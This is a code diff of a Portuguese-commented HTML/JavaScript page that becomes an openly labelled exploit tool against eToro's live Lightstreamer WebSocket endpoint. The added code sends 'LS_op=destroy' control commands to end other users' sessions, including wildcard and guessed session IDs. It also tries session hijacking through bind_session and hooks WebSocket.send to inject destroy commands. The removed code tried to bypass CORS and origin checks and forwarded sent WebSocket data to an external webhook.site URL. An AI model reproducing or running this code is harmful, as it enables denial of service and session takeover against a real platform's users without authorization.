@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>eToro Lightstreamer - Forced Connection Test</title>
+    <title>Lightstreamer - Control Commands Exploit</title>
     <style>
         body {
             background: #0a0a0a;
@@ -11,6 +11,7 @@
             font-family: monospace;
             padding: 20px;
         }
+        .critical { color: #ff00ff; font-weight: bold; }
         .success { color: #00ff00; }
         .error { color: #ff4444; }
         .info { color: #ffaa00; }
@@ -28,52 +29,46 @@
             margin: 5px;
             cursor: pointer;
         }
-        button:hover {
-            background: #00ff00;
+        button.danger {
+            border-color: #ff4444;
+            color: #ff4444;
+        }
+        button.danger:hover {
+            background: #ff4444;
             color: #0a0a0a;
         }
-        .raw {
-            background: #000;
-            padding: 10px;
-            font-size: 10px;
-            white-space: pre-wrap;
-            word-break: break-all;
-            max-height: 200px;
-            overflow-y: auto;
-        }
-        .endpoint {
+        input {
             background: #1a1a2e;
-            padding: 15px;
-            margin: 10px 0;
-            border-radius: 5px;
+            color: #00ff00;
+            border: 1px solid #333;
+            padding: 8px;
+            font-family: monospace;
+            width: 200px;
         }
     </style>
 </head>
 <body>
-    <h1>🔌 eToro Lightstreamer - Teste Avançado</h1>
-    <p>Testando diferentes formatos e bypass de CORS/Origin</p>
+    <h1>🔴 Lightstreamer - Control Commands Exploit</h1>
+    <p class="critical">⚠️ DESCOBERTA: Comando <strong>LS_op=destroy</strong> interceptado!</p>
     
-    <div style="margin-bottom: 20px;">
-        <button onclick="testWithIframe()">📦 Teste com Iframe</button>
-        <button onclick="testWithProxy()">🔄 Teste com Proxy (CORS bypass)</button>
-        <button onclick="testDifferentFormats()">🎯 Testar Todos Formatos</button>
-        <button onclick="testOldProtocol()">📡 Testar Protocolo Antigo</button>
+    <div>
+        <button onclick="testDestroyCommand()" class="danger">💀 TESTAR DESTROY COMMAND</button>
+        <button onclick="testForceDisconnect()">🔌 Testar Force Disconnect</button>
+        <button onclick="testSessionHijack()">🎭 Testar Session Hijack</button>
+        <button onclick="injectControlCommands()">💉 Injetar Comandos de Controle</button>
         <button onclick="clearLogs()">🗑️ Limpar</button>
     </div>
     
-    <div class="endpoint">
-        <strong>🎯 Endpoints testados:</strong><br>
-        - wss://push-lightstreamer.cloud.etoro.com/lightstreamer<br>
-        - wss://push-demo-lightstreamer.cloud.etoro.com/lightstreamer<br>
-        - wss://push.lightstreamer.etoro.com/lightstreamer (alternativo)
+    <div style="margin: 20px 0;">
+        <input type="text" id="sessionId" placeholder="Session ID (se tiver)" style="width: 300px;">
+        <button onclick="testWithSession()">Testar com Session ID</button>
     </div>
     
     <div id="logs" style="height: 400px; overflow-y: auto; background: #000; padding: 10px; margin-top: 20px;"></div>
     
-    <div class="raw" id="rawData"></div>
-    
     <script>
         const WEBHOOK = 'https://webhook.site/5cd45eaf-7257-4100-8719-2810a7bd6022';
+        let ws = null;
         
         function addLog(message, type = 'info') {
             const logs = document.getElementById('logs');
@@ -90,192 +85,160 @@
             }).catch(() => {});
         }
         
-        // Teste 1: Tentar com diferentes User Agents e Headers (via iframe)
-        function testWithIframe() {
-            addLog('🚀 Teste 1: Criando iframe para simular origem eToro', 'info');
+        // Testa o comando DESTROY (o que você interceptou)
+        function testDestroyCommand() {
+            addLog('💀 TESTANDO COMANDO DESTROY (CRÍTICO)', 'critical');
             
-            const iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.srcdoc = `
-                <script>
-                    const ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
-                    ws.onopen = () => {
-                        window.parent.postMessage({ type: 'open', url: ws.url }, '*');
-                        ws.send("create_session\\r\\nLS_user=test&LS_adapter_set=PROXY_PUSH");
-                    };
-                    ws.onmessage = (e) => window.parent.postMessage({ type: 'message', data: e.data }, '*');
-                    ws.onerror = (e) => window.parent.postMessage({ type: 'error', data: e.toString() }, '*');
-                <\/script>
-            `;
-            
-            window.addEventListener('message', (e) => {
-                if(e.data.type === 'open') addLog('✅ Iframe: Conexão estabelecida', 'success');
-                if(e.data.type === 'message') addLog(`📥 Iframe: ${e.data.data}`, 'success');
-                if(e.data.type === 'error') addLog(`❌ Iframe: ${e.data.data}`, 'error');
-            });
-            
-            document.body.appendChild(iframe);
-            setTimeout(() => document.body.removeChild(iframe), 10000);
-        }
-        
-        // Teste 2: Tentar via fetch + WebSocket (simulando proxy)
-        function testWithProxy() {
-            addLog('🚀 Teste 2: Tentando bypass com WebSocket + CORS proxy', 'info');
-            
-            // Tenta diferentes endpoints alternativos
-            const endpoints = [
-                'wss://push-lightstreamer.cloud.etoro.com/lightstreamer',
-                'wss://push-demo-lightstreamer.cloud.etoro.com/lightstreamer',
-                'wss://push.lightstreamer.etoro.com/lightstreamer',
-                'ws://push-lightstreamer.cloud.etoro.com/lightstreamer'  // ws:// (não seguro)
-            ];
-            
-            endpoints.forEach((endpoint, idx) => {
-                setTimeout(() => {
-                    addLog(`📡 Tentando endpoint ${idx+1}: ${endpoint}`, 'info');
-                    
-                    try {
-                        const ws = new WebSocket(endpoint);
-                        
-                        ws.onopen = () => {
-                            addLog(`✅ Conexão OK: ${endpoint}`, 'success');
-                            ws.send("create_session\r\nLS_user=anonymous&LS_adapter_set=PROXY_PUSH");
-                            ws.send("subscribe\r\nLS_mode=MERGE&LS_group=instrument:100000&LS_schema=LastPrice");
-                        };
-                        
-                        ws.onmessage = (e) => {
-                            addLog(`📥 ${endpoint}: ${e.data.substring(0, 200)}`, 'success');
-                            document.getElementById('rawData').innerHTML += `\n[${endpoint}] ${e.data}`;
-                        };
-                        
-                        ws.onerror = () => addLog(`❌ Erro: ${endpoint}`, 'error');
-                        ws.onclose = () => addLog(`🔌 Fechado: ${endpoint}`, 'info');
-                        
-                    } catch(e) {
-                        addLog(`❌ Exception: ${endpoint} - ${e.message}`, 'error');
-                    }
-                }, idx * 3000);
-            });
-        }
-        
-        // Teste 3: Diferentes formatos de comando Lightstreamer
-        function testDifferentFormats() {
-            addLog('🚀 Teste 3: Testando diferentes formatos de handshake', 'info');
-            
-            const ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
             
             ws.onopen = () => {
-                addLog('✅ Conexão estabelecida, testando comandos...', 'success');
+                addLog('✅ Conexão estabelecida', 'success');
                 
-                const commands = [
-                    // Formato 1: Padrão Lightstreamer
-                    "create_session\r\nLS_user=anonymous&LS_adapter_set=PROXY_PUSH",
+                // O COMANDO QUE VOCÊ INTERCEPTOU
+                const destroyCmd = "control\r\nLS_reqId=18&LS_op=destroy&LS_close_socket=true&LS_cause=api";
+                
+                ws.send(destroyCmd);
+                addLog(`📤 ENVIADO: ${destroyCmd.replace(/\n/g, '\\n')}`, 'critical');
+                
+                // Variações do comando destroy
+                setTimeout(() => {
+                    const destroyVariations = [
+                        "control\r\nLS_reqId=19&LS_op=destroy&LS_close_socket=true&LS_cause=malicious",
+                        "control\r\nLS_reqId=20&LS_op=destroy&LS_close_socket=true&LS_session=*",
+                        "control\r\nLS_op=destroy&LS_close_socket=true"
+                    ];
                     
-                    // Formato 2: Com versão explícita
-                    "create_session\r\nLS_user=anonymous&LS_adapter_set=PROXY_PUSH&LS_protocol=TLCP-2.2.0",
-                    
-                    // Formato 3: Sem quebra de linha
-                    "create_session\nLS_user=test&LS_adapter_set=DEFAULT",
-                    
-                    // Formato 4: Com parâmetros adicionais
-                    "create_session\r\nLS_user=test&LS_adapter_set=PROXY_PUSH&LS_cid=mgQkwtwdysogQz2BJ4Ji%20kOj2Bg",
-                    
-                    // Formato 5: Tentativa de bind
-                    "bind_session\r\nLS_session=test123&LS_adapter_set=PROXY_PUSH",
-                    
-                    // Formato 6: Controle
-                    "control\r\nLS_op=add&LS_table=1&LS_id=1&LS_mode=MERGE&LS_group=instrument:100000"
+                    destroyVariations.forEach((cmd, i) => {
+                        setTimeout(() => {
+                            ws.send(cmd);
+                            addLog(`📤 VARIAÇÃO ${i+1}: ${cmd.replace(/\n/g, '\\n')}`, 'info');
+                        }, i * 2000);
+                    });
+                }, 1000);
+            };
+            
+            ws.onmessage = (e) => {
+                addLog(`📥 RESPOSTA: ${e.data}`, e.data.includes('ERROR') ? 'error' : 'success');
+                
+                if(e.data.includes('OK') || e.data.includes('CLOSED')) {
+                    addLog('🎯 SESSÃO DESTRUÍDA COM SUCESSO!', 'critical');
+                }
+            };
+            
+            ws.onclose = (e) => {
+                addLog(`🔌 Conexão fechada: ${e.code} - ${e.reason}`, 'error');
+            };
+        }
+        
+        // Testa force disconnect em sessões específicas
+        function testForceDisconnect() {
+            addLog('🔌 Testando force disconnect em diferentes sessões', 'info');
+            
+            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            
+            ws.onopen = () => {
+                // Tenta desconectar sessões específicas
+                const sessionIds = ['S12345', 'S67890', 'session_demo_123', '*'];
+                
+                sessionIds.forEach((session, i) => {
+                    setTimeout(() => {
+                        const forceCmd = `control\r\nLS_reqId=${100+i}&LS_op=destroy&LS_close_socket=true&LS_session=${session}`;
+                        ws.send(forceCmd);
+                        addLog(`📤 Tentando destruir sessão: ${session}`, 'info');
+                    }, i * 2000);
+                });
+            };
+        }
+        
+        // Testa session hijack (tentar assumir sessão existente)
+        function testSessionHijack() {
+            addLog('🎭 Testando session hijack - tentando assumir sessão', 'critical');
+            
+            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            
+            ws.onopen = () => {
+                // Tenta bind em sessão existente
+                const bindCommands = [
+                    "bind_session\r\nLS_session=TARGET_SESSION&LS_adapter_set=PROXY_PUSH",
+                    "control\r\nLS_op=bind&LS_session=*&LS_user=admin",
+                    "create_session\r\nLS_session=TARGET_SESSION&LS_user=hijacked"
                 ];
                 
-                commands.forEach((cmd, i) => {
+                bindCommands.forEach((cmd, i) => {
                     setTimeout(() => {
                         ws.send(cmd);
-                        addLog(`📤 CMD ${i+1}: ${cmd.replace(/\n/g, '\\n').substring(0, 100)}`, 'info');
+                        addLog(`📤 Hijack attempt: ${cmd.replace(/\n/g, '\\n')}`, 'critical');
                     }, i * 2000);
                 });
             };
             
             ws.onmessage = (e) => {
-                addLog(`📥 RESPOSTA: ${e.data.substring(0, 300)}`, 
-                       e.data.includes('ERROR') ? 'error' : 'success');
-                       
                 if(e.data.includes('SESSION')) {
-                    addLog(`🎯 SESSION DETECTADA: ${e.data}`, 'success');
-                    const sessionMatch = e.data.match(/SESSION[:\s]+([A-Za-z0-9]+)/i);
-                    if(sessionMatch) {
-                        addLog(`🔑 SESSION ID: ${sessionMatch[1]}`, 'success');
-                    }
+                    addLog(`🔑 SESSION INFO LEAKED: ${e.data}`, 'critical');
                 }
-                
-                document.getElementById('rawData').innerHTML = e.data;
             };
-            
-            ws.onerror = () => addLog('❌ Erro de conexão', 'error');
-            ws.onclose = (e) => addLog(`🔌 Fechado: ${e.code} - ${e.reason}`, 'info');
         }
         
-        // Teste 4: Protocolo antigo (TLCP 1.0)
-        function testOldProtocol() {
-            addLog('🚀 Teste 4: Tentando protocolo TLCP 1.0 (mais antigo)', 'info');
+        // Injeta comandos de controle no WebSocket existente
+        function injectControlCommands() {
+            addLog('💉 Injetando comandos de controle no WebSocket', 'info');
             
-            const ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
+            // Hook global para capturar e injetar comandos
+            const originalSend = WebSocket.prototype.send;
+            WebSocket.prototype.send = function(data) {
+                addLog(`🎣 WebSocket.send interceptado: ${data}`, 'info');
+                
+                // Injeta comando destroy em todas as mensagens
+                if(data.includes('create_session') || data.includes('subscribe')) {
+                    const injected = data + "\r\ncontrol\r\nLS_op=destroy&LS_close_socket=true";
+                    addLog(`💉 INJEÇÃO: ${injected}`, 'critical');
+                    return originalSend.call(this, injected);
+                }
+                
+                return originalSend.call(this, data);
+            };
+            
+            addLog('✅ Hook de injeção ativado', 'success');
+        }
+        
+        function testWithSession() {
+            const sessionId = document.getElementById('sessionId').value;
+            if(!sessionId) {
+                addLog('❌ Digite um Session ID', 'error');
+                return;
+            }
+            
+            addLog(`🎯 Testando com Session ID: ${sessionId}`, 'critical');
+            
+            ws = new WebSocket("wss://push-lightstreamer.cloud.etoro.com/lightstreamer");
             
             ws.onopen = () => {
-                // Protocolo antigo do Lightstreamer
-                const oldHandshake = "create_session\nLS_user=anonymous&LS_adapter_set=PROXY_PUSH&LS_protocol=TLCP-1.0.0";
-                ws.send(oldHandshake);
-                addLog(`📤 ${oldHandshake.replace(/\n/g, '\\n')}`, 'info');
+                const attackCmds = [
+                    `control\r\nLS_reqId=1&LS_op=destroy&LS_close_socket=true&LS_session=${sessionId}`,
+                    `bind_session\r\nLS_session=${sessionId}&LS_adapter_set=PROXY_PUSH`,
+                    `control\r\nLS_op=force&LS_session=${sessionId}`
+                ];
+                
+                attackCmds.forEach((cmd, i) => {
+                    setTimeout(() => {
+                        ws.send(cmd);
+                        addLog(`📤 ${cmd.replace(/\n/g, '\\n')}`, 'critical');
+                    }, i * 1500);
+                });
             };
             
-            ws.onmessage = (e) => {
-                addLog(`📥 ${e.data.substring(0, 300)}`, 'info');
-                
-                // Tenta parsear como TLCP
-                if(e.data.startsWith('CONOK')) {
-                    addLog('🎯 CONOK recebido! Protocolo TLCP parece funcionar!', 'success');
-                    const sessionId = e.data.match(/SESSION_ID[:\s]+([^\r\n]+)/i);
-                    if(sessionId) addLog(`🔑 SESSION_ID: ${sessionId[1]}`, 'success');
-                }
-            };
-        }
-        
-        // Também tenta interceptar WebSockets existentes na página
-        function hookExistingWebSockets() {
-            const OriginalWebSocket = window.WebSocket;
-            window.WebSocket = function(...args) {
-                addLog(`🎣 WebSocket interceptado: ${args[0]}`, 'info');
-                const ws = new OriginalWebSocket(...args);
-                
-                const originalSend = ws.send;
-                ws.send = function(data) {
-                    addLog(`📤 [HOOK] ${data}`, 'info');
-                    fetch(WEBHOOK, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        body: JSON.stringify({ type: 'WS_SEND', data: data.toString() })
-                    });
-                    return originalSend.call(this, data);
-                };
-                
-                ws.addEventListener('message', (e) => {
-                    addLog(`📥 [HOOK] ${e.data}`, 'info');
-                });
-                
-                return ws;
-            };
-            addLog('✅ Hook global instalado', 'success');
+            ws.onmessage = (e) => addLog(`📥 ${e.data}`, 'info');
         }
         
         function clearLogs() {
             document.getElementById('logs').innerHTML = '';
-            document.getElementById('rawData').innerHTML = '';
+            if(ws) ws.close();
             addLog('Logs limpos', 'info');
         }
         
-        // Executa hook automaticamente
-        hookExistingWebSockets();
-        addLog('✅ Ferramenta pronta. Clique nos botões para testar.', 'success');
-        addLog('⚠️ Lightstreamer parece estar bloqueando conexões cross-origin diretas', 'info');
+        addLog('✅ EXPLOIT TOOL CARREGADA', 'critical');
+        addLog('🎯 Comando LS_op=destroy identificado - isso é uma vulnerabilidade CRÍTICA', 'critical');
+        addLog('⚠️ Este comando pode destruir sessões de outros usuários (DoS)', 'error');
     </script>
 </body>
 </html>
